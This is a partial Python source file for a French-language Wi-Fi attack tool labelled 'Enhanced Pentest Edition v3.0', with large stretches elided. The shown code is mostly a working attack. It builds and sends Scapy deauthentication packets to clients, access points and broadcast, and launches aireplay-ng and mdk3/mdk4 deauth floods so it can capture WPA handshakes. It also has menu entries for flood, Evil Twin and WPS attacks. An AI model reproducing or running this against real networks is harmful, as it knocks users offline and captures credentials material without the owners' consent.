...
""" + RESET)
    ...
    print(f"{CYAN}                  Enhanced Pentest Edition v3.0{RESET}\n")
...
def cleanup():
    global active_processes, stop_attack
    stop_attack = True
    ...
    temp_files = ["/tmp/hostapd.conf", "/tmp/dnsmasq.conf", "/tmp/bssid_list.txt"]
    for f in temp_files:
        try:
            os.remove(f)
        except:
...
def get_interfaces():
    try:
        ...
        print(f"{RED}[-] Erreur récupération interfaces : {e}{RESET}")
        return []
...
def enable_monitor_mode(interface):
    try:
        ...
        print(f"{RED}[-] Erreur activation mode monitor : {e}{RESET}")
        return None
...
def disable_monitor_mode(mon_iface):
    try:
        ...
        print(f"{RED}[-] Erreur désactivation : {e}{RESET}")
...
def run_airodump(interface, duration=15):
    ...
    try:
        ...
        print(f"{RED}[-] Erreur scan : {e}{RESET}")
        return None
...
def parse_scan_results(filename):
    ...
    try:
        ...
        print(f"{RED}[-] Erreur parsing : {e}{RESET}")
        return aps, clients
...
def set_channel(interface, channel):
    try:
        ...
        print(f"{RED}[-] Erreur configuration canal : {e}{RESET}")
...
def attack_deauth(ap, clients, interface):
        ...
        while time.time() < end_time and not stop_attack:
            for pkt in packets:
                ...
                try:
                    ...
                    print(f"{RED}[-] Erreur envoi paquet : {e}{RESET}")
            time.sleep(0.1)
            
            if packet_count % 500 == 0 and packet_count > 0:
    ...
    attack_thread = Thread(target=send_loop, daemon=True)
    attack_thread.start()
...
# === 2. Capture de handshake avec options multiples ===
def capture_handshake(ap, clients, interface):
    global stop_attack, active_processes
    stop_attack = False
    ...
    # Menu d'options de capture
    print(f"\n{BLUE}Méthodes de capture :{RESET}")
    print(f"{YELLOW}1.{RESET} Airodump-ng (passif)")
    print(f"{YELLOW}2.{RESET} Airodump-ng + Deauth (Scapy)")
    print(f"{YELLOW}3.{RESET} Airodump-ng + Aireplay-ng Deauth")
    print(f"{YELLOW}4.{RESET} Airodump-ng + MDK4 Deauth")
    print(f"{YELLOW}5.{RESET} Airodump-ng + MDK3 Deauth")
    
    method = input(f"{ORANGE}[?] Méthode (défaut: 2) : {RESET}").strip() or "2"
    ...
    try:
        ...
        print(f"{RED}[-] Erreur lancement capture : {e}{RESET}")
        return
    
    time.sleep(3)
    
    # Lancer l'attaque selon la méthode
    deauth_thread = None
    
    if method == "2":
        # Deauth avec Scapy
        print(f"{GREEN}[+] Envoi de paquets de déauthentification (Scapy)...{RESET}")
            ...
            while not stop_attack:
                ...
                if client_list:
                    for client in client_list:
                        if stop_attack:
                            break
                        pkt_to_client = RadioTap() / Dot11(addr1=client, addr2=ap['bssid'], addr3=ap['bssid']) / Dot11Deauth(reason=7)
                        pkt_to_ap = RadioTap() / Dot11(addr1=ap['bssid'], addr2=client, addr3=client) / Dot11Deauth(reason=7)
                        try:
                            sendp(pkt_to_client, iface=interface, verbose=0)
                    ...
                    pkt_broadcast = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=ap['bssid'], addr3=ap['bssid']) / Dot11Deauth(reason=7)
                    try:
                        sendp(pkt_broadcast, iface=interface, verbose=0)
                    except:
                        pass
                time.sleep(0.2)
        
        deauth_thread = Thread(target=scapy_deauth, daemon=True)
        deauth_thread.start()
        
    elif method == "3":
        # Aireplay-ng Deauth
        print(f"{GREEN}[+] Envoi de paquets avec aireplay-ng...{RESET}")
        client_list = clients.get(ap['bssid'], [])
        if client_list:
            for client in client_list:
                try:
                    ...
                    print(f"{RED}[-] Erreur aireplay : {e}{RESET}")
        else:
            try:
                deauth_proc = subprocess.Popen([
                    "aireplay-ng", "--deauth", "0",
        ...
        # MDK4/MDK3 Deauth
        mdk_cmd = "mdk4" if method == "4" else "mdk3"
        mdk_check = subprocess.run(["which", mdk_cmd], capture_output=True).returncode == 0
        
        if not mdk_check:
            print(f"{RED}[-] {mdk_cmd} n'est pas installé !{RESET}")
        else:
            print(f"{GREEN}[+] Envoi avec {mdk_cmd}...{RESET}")
            with open("/tmp/bssid_list.txt", "w") as f:
                f.write(ap['bssid'] + "\n")
            try:
                mdk_proc = subprocess.Popen([
                    mdk_cmd, interface, "d", "-b", "/tmp/bssid_list.txt", "-c", ap['channel']
                ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                active_processes.append(mdk_proc)
            except Exception as e:
                print(f"{RED}[-] Erreur {mdk_cmd} : {e}{RESET}")
...
def attack_flood(ap, interface):
    ...
    try:
        ...
        print(f"{RED}[-] Erreur lancement attaque : {e}{RESET}")
        return
...
"""
    ...
    try:
        ...
        print(f"{RED}[-] Erreur Evil Twin : {e}{RESET}")
...
def attack_wps(ap, interface):
    ...
    try:
        ...
        print(f"{RED}[-] Erreur WPS : {e}{RESET}")
...
def attack_menu(ap, clients, interface):
    while True:
        ...
        print(f"{YELLOW}2.{RESET} Capture de Handshake (Multi-méthodes)")
